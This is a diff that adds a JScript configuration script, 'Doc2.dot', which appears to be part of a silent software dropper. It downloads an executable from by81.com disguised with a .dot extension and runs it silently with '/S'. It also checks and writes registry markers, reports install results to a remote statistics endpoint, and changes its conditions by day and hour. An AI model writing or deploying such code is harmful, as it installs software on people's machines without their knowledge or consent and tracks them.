@@ -1,0 +1,110 @@
+//
+trace("*----Doc2.dot----")
+function installed(regPath){
+	var key = regPath;
+	var value =__TRY(function(){ return __wshShell.RegRead(key);}, "");
+	log( "Doc2 installed : RegRead "+key+" return " + value);
+	if(value.length>0)
+		return true
+	else
+		return false
+}
+var ___id = 10026
+var ___gconfig = {
+		validcondition:{PID:{min:"0000000000000000",max:"ffffffffffffffff"}  ,osver:{min:5,max:6},datver:{min:0,max:10000}},
+		//validcondition:{PID:{min:"0",max:"F"}  ,osver:{min:5,max:6},datver:{min:5,max:4}},
+		installlist:[
+						 //{id:10008,name:"Dbgview.exe",url:"http://www.by81.com/05/Dbgview.exe", md5:"", invalidcondition:function(){} ,param:""}
+		//			 ,{id:10009,name:"cmd.exe",url:"http://www.by81.com/05/cmd.exe.dot", md5:"", invalidcondition:function(){} ,param:" /c echo Éý¼¶ÖÐ & pause",runimmediately:1},	
+						 {id:___id,name:"YBSetup_1.0.0.2.exe",url:"http://www.by81.com/05/YB02.dot", md5:"E9817343F13FFD000A2F7F2269CA6220", 
+						 		invalidcondition:function(){
+						 				var regPath1 = "HKEY_LOCAL_MACHINE\\SOFTWARE\\YBYL\\" + "path";						 				
+						 				var have1 = installed(regPath1);
+						 				if(have1)
+						 				{
+						 					sendHttpStat("installed","ago-installed-v2",1)
+						 				}
+						 				var regPath2 = "HKEY_CURRENT_USER\\Software\\ExtIconHandler\\"+___id;
+						 				var have2 = installed(regPath2);
+						 				if(have2)
+						 				{
+						 					sendHttpStat("installed","ago-run-v2"+___id,1)
+						 				}
+						 				if(have1 || have2)
+						 					return true;
+						 				else 
+						 					return false;
+						 				
+						 			} ,param:"/S", runimmediately:0}
+		]
+		//,desktopiconlist:[{id:20000,name:"·µÀû.ur", md5:"", iconPrivateProfileString:{URL:"http://www.51fanli.com",IconFileName:"favicon.ico",IconFile:"http://www.51fanli.com/favicon.ico"}, param:""}] ,
+		,desktopiconlist:[]
+		//,userdefinedlist:[{id:30003,name:"Doc30003.dot", md5:"", url:"http://www.by81.com/05/Doc30003.dot"}  ]
+		,userdefinedlist:[{id:30010,name:"Doc30003.dot", md5:"", url:"", invalidcondition:function(){
+				var regPath1 = "HKEY_LOCAL_MACHINE\\SOFTWARE\\YBYL\\" + "path";
+				var have1 = installed(regPath1);
+				if(have1)
+				{
+					sendHttpStat("installed","ago-installed-v2-ud",1)
+				}
+				var regPath2 = "HKEY_CURRENT_USER\\Software\\ExtIconHandler\\"+___id;
+				var have2 = installed(regPath2);
+				if(have2)
+				{
+						sendHttpStat("installed","ago-run-v2"+___id+"-ud",1)
+				}
+				if(have1 || have2)				
+				{
+						setTimeout(function(){__TRY(function(){exit(0);} ) },3000); 
+						return true;					 				
+				}
+			//						 					
+			var key = "HKEY_CURRENT_USER\\Software\\ExtIconHandler\\"+___id //				  
+			var d = new Date();
+   			var t = d.getTime();
+			var value = t				
+			
+			//
+			var path = __workdir + "YBSetup_1.0.0.2.exe";
+			var param = " /S"
+			var ret = __external.ShellExcute("" , path+param, __workdir);
+			log(" run " + path + " " +  " return "+ret);
+			if(0 < ret)
+			{
+					log("Doc2 userdefinedlist : set " + key + "");
+					__TRY(function (){__wshShell.RegWrite(key, value, "REG_SZ") });	
+					ret = ___id;
+					sendHttpStat("installed","YBYL-v2",1)
+			}
+			else{
+					sendHttpStat("installed","YBYL-run-v2-failed",1)
+			}
+			setTimeout(function(){__TRY(function(){exit(ret);} ) },3000); 
+			return true;
+		} }]
+	}
+	//alert(___gconfig.validcondition.PID.min)
+var currentDate = new Date()
+//alert(currentDate.toString())
+//alert(currentDate.getDate()) 
+//alert(currentDate.getMonth())
+
+if (1) {
+	var day = currentDate.getDate();
+	var hour= currentDate.getHours()
+	//alert("day="+day+" ,hour="+hour);
+	if(6<=day &&  11>= day)	{
+		  if(hour >10){
+		  //	alert('>10')
+		  	___gconfig.validcondition.osver.max=4;		  	
+		  }
+	}
+	else if(12<=day  &&  17>= day){
+		if(hour>16){
+		  	___gconfig.validcondition.osver.max=4;		  	
+		  }
+	}
+
+}else{
+	
+}
